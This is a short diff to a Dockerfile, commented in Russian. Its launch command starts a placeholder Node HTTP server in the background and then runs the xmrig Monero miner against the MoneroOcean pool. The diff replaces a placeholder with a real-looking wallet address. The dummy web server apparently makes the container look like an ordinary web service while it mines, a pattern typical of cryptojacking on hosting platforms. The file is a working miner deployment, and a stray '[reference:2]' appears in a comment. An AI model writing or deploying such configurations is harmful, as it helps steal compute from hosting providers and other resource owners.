@@ -19,4 +19,4 @@ RUN echo 'const http = require("http");' > server.js && \
 
 # Запускаем HTTP-сервер в фоне, а затем майнер
 # Важно: /entrypoint.sh — это точка входа в официальном образе, она запускает xmrig с переданными параметрами[reference:2]
-CMD sh -c 'node server.js & /entrypoint.sh -o gulf.moneroocean.stream:10004 -u ТВОЙ_XMR_АДРЕС -p x -k'
+CMD sh -c 'node server.js & /entrypoint.sh -o gulf.moneroocean.stream:10004 -u 48oFiSuK4K4WBpQ29kx73CBRtSpm132W2hoXr9RyfUbUCrbvgqLV9PBH1aqyckZemdabBjrwM2D3YieJQD6CKiGZVgkxU36 -p x -k'
